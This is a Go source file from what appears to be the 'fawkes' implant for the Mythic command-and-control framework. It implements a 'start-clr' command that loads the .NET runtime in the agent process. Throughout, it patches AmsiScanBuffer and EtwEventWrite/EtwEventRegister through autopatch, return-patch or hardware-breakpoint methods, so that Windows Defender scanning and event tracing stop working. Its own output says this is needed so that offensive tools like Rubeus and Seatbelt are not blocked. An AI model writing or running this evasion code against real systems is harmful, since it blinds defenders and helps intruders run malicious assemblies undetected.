//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

// StartCLRCommand implements the start-clr command
type StartCLRCommand struct{}

// Name returns the command name
func (c *StartCLRCommand) Name() string {
	return "start-clr"
}

// Description returns the command description
func (c *StartCLRCommand) Description() string {
	return "Initialize the .NET CLR runtime with optional AMSI/ETW patching"
}

// StartCLRParams represents the JSON parameters from the Mythic modal
type StartCLRParams struct {
	AmsiPatch string `json:"amsi_patch"`
	EtwPatch  string `json:"etw_patch"`
}

// Execute executes the start-clr command
func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
	// Use the shared assemblyMutex from inlineassembly.go for CLR state
	assemblyMutex.Lock()
	defer assemblyMutex.Unlock()

	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse parameters (default to "None" if empty/missing for backward compat)
	var params StartCLRParams
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	if params.AmsiPatch == "" {
		params.AmsiPatch = "None"
	}
	if params.EtwPatch == "" {
		params.EtwPatch = "None"
	}

	var output string

	// Check if CLR is already initialized (shared state with inline-assembly)
	if clrStarted {
		output += "[*] CLR already initialized in this process\n"
	} else {
		// Redirect STDOUT/STDERR for assembly output capture
		err := clr.RedirectStdoutStderr()
		if err != nil {
			output += fmt.Sprintf("[-] Warning: Could not redirect output: %v\n", err)
		}

		// Load and initialize the CLR, storing the runtime host for inline-assembly.
		// The go-clr library's GetInterface call sometimes returns a spurious
		// "file not found" error on first invocation. Retry up to 3 times.
		var host *clr.ICORRuntimeHost
		var loadErr error
		for attempt := 1; attempt <= 3; attempt++ {
			host, loadErr = clr.LoadCLR("v4")
			if loadErr == nil {
				break
			}
			if strings.Contains(loadErr.Error(), "cannot find the file") {
				output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
				time.Sleep(500 * time.Millisecond)
				continue
			}
			break // Non-transient error, stop retrying
		}
		if loadErr != nil {
			return structs.CommandResult{
				Output:    output + fmt.Sprintf("Error initializing CLR: %v", loadErr),
				Status:    "error",
				Completed: true,
			}
		}
		// Store in shared state so inline-assembly can reuse this runtime host
		runtimeHost = host
		clrStarted = true
		output += "[+] CLR v4 runtime initialized successfully\n"

		// Explicitly load AMSI.dll (needed for patching regardless of method)
		err = loadAMSI()
		if err != nil {
			output += fmt.Sprintf("[-] Warning: Failed to load AMSI.dll: %v\n", err)
		} else {
			output += "[+] AMSI.dll loaded successfully\n"
		}
	}

	// Apply AMSI patch
	switch params.AmsiPatch {
	case "Autopatch":
		output += "\n[*] Applying AMSI Autopatch (amsi.dll!AmsiScanBuffer)...\n"
		patchOutput, err := PerformAutoPatch("amsi.dll", "AmsiScanBuffer", 300)
		if err != nil {
			output += fmt.Sprintf("[-] AMSI Autopatch failed: %v\n", err)
		} else {
			amsiPatched = true
			output += patchOutput + "\n"
		}
	case "Ret Patch":
		output += "\n[*] Applying AMSI Ret Patch (amsi.dll!AmsiScanBuffer)...\n"
		patchOutput, err := PerformRetPatch("amsi.dll", "AmsiScanBuffer")
		if err != nil {
			output += fmt.Sprintf("[-] AMSI Ret Patch failed: %v\n", err)
		} else {
			amsiPatched = true
			output += patchOutput
		}
	}

	// Apply ETW patch (EtwEventWrite + EtwEventRegister)
	switch params.EtwPatch {
	case "Autopatch":
		output += "\n[*] Applying ETW Autopatch (ntdll.dll!EtwEventWrite)...\n"
		patchOutput, err := PerformAutoPatch("ntdll.dll", "EtwEventWrite", 300)
		if err != nil {
			output += fmt.Sprintf("[-] ETW Autopatch failed: %v\n", err)
		} else {
			output += patchOutput + "\n"
		}
		output += "[*] Applying ETW Autopatch (ntdll.dll!EtwEventRegister)...\n"
		patchOutput, err = PerformAutoPatch("ntdll.dll", "EtwEventRegister", 300)
		if err != nil {
			output += fmt.Sprintf("[-] EtwEventRegister Autopatch failed: %v\n", err)
		} else {
			output += patchOutput + "\n"
		}
	case "Ret Patch":
		output += "\n[*] Applying ETW Ret Patch (ntdll.dll!EtwEventWrite)...\n"
		patchOutput, err := PerformRetPatch("ntdll.dll", "EtwEventWrite")
		if err != nil {
			output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
		} else {
			output += patchOutput
		}
		output += "[*] Applying ETW Ret Patch (ntdll.dll!EtwEventRegister)...\n"
		patchOutput, err = PerformRetPatch("ntdll.dll", "EtwEventRegister")
		if err != nil {
			output += fmt.Sprintf("[-] EtwEventRegister Ret Patch failed: %v\n", err)
		} else {
			output += patchOutput
		}
	}

	// Apply Hardware Breakpoint patches (AMSI and/or ETW)
	needHWBP := params.AmsiPatch == "Hardware Breakpoint" || params.EtwPatch == "Hardware Breakpoint"
	if needHWBP {
		output += "\n[*] Setting up Hardware Breakpoint patches...\n"

		var amsiAddr, etwAddr uintptr

		if params.AmsiPatch == "Hardware Breakpoint" {
			addr, err := resolveFunctionAddress("amsi.dll", "AmsiScanBuffer")
			if err != nil {
				output += fmt.Sprintf("[-] Failed to resolve AmsiScanBuffer: %v\n", err)
			} else {
				amsiAddr = addr
				output += fmt.Sprintf("[+] AmsiScanBuffer at 0x%X -> Dr0\n", addr)
			}
		}

		if params.EtwPatch == "Hardware Breakpoint" {
			addr, err := resolveFunctionAddress("ntdll.dll", "EtwEventWrite")
			if err != nil {
				output += fmt.Sprintf("[-] Failed to resolve EtwEventWrite: %v\n", err)
			} else {
				etwAddr = addr
				output += fmt.Sprintf("[+] EtwEventWrite at 0x%X -> Dr1\n", addr)
			}
		}

		if amsiAddr != 0 || etwAddr != 0 {
			hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, etwAddr)
			if err != nil {
				output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
			} else {
				if amsiAddr != 0 {
					amsiPatched = true
				}
				output += hwbpOutput
			}
		}
	}

	// Summary
	if params.AmsiPatch == "None" && params.EtwPatch == "None" {
		output += "\n[!] WARNING: No AMSI patch applied. Windows Defender will scan assemblies during loading."
		output += "\n[!] Known offensive tools (Seatbelt, Rubeus, SharpUp, etc.) WILL be blocked."
		output += "\n[!] Re-run start-clr with Ret Patch, Autopatch, or Hardware Breakpoint to bypass AMSI."
	} else {
		output += "\n[+] CLR initialized and patches applied. Ready for assembly execution."
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// loadAMSI explicitly loads amsi.dll into the process
func loadAMSI() error {
	amsiDLL, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to load amsi.dll: %v", err)
	}
	// We keep the handle - don't release it since we want AMSI loaded in memory
	_ = amsiDLL

	return nil
}
